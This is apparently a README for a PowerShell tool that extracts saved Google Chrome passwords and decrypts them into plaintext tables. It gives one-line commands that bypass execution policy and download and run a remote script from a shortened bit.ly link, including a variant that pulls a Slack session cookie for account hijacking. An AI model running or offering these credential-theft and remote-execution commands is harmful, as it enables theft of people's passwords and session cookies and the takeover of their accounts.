# Get-ChromePasswords
```PowerShell
.Synopsis
  Quickly retrieve Google Chrome passwords using powershell (please note this creates sqlite assemblies in your temp directory)

.PARAMETER Path
  
  The optional path to a non-standard database location for the Google Chrome Login Data database.  Generally found at '<APPDATA>\Local\Google\Chrome\Default\Login Data'

.EXAMPLE
  PS> .\Get-ChromePasswords

  Url                                                                                                    Username                  Password
  ---                                                                                                    --------                  --------
  https://accounts.google.com/signin/challenge/sl/password                                               user1                     password
  ...
```

## Quick mode...

```PowerShell
  C:\> powershell -exec bypass -c "IEX((new-object net.webclient).downloadstring('https://bit.ly/2OMBArT'));Get-ChromeCreds"
```

## Just pull "d" Cookie for use with SlackExtract...

```PowerShell
  C:\> powershell -exec bypass -c "IEX((new-object net.webclient).downloadstring('https://bit.ly/2OMBArT'));Get-ChromeCreds -SlackExtract"
```

